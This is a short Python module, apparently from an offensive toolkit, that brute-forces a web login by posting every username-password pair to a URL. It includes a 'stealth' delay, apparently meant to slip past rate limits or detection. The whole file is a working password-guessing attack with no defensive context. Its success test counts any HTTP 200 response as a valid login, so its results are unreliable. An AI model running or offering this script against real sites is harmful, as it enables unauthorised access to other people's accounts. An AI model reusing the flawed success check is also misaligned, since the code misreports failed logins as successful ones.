# core/brute.py

import requests
import time
from itertools import product

def brute_force_login(url, usernames, passwords, stealth=False):
    success = []
    for username, password in product(usernames, passwords):
        try:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data, timeout=5)
            if "Welcome" in response.text or response.status_code == 200:
                success.append((username, password))
                break
        except Exception:
            continue
        if stealth:
            time.sleep(1.5)
    return success
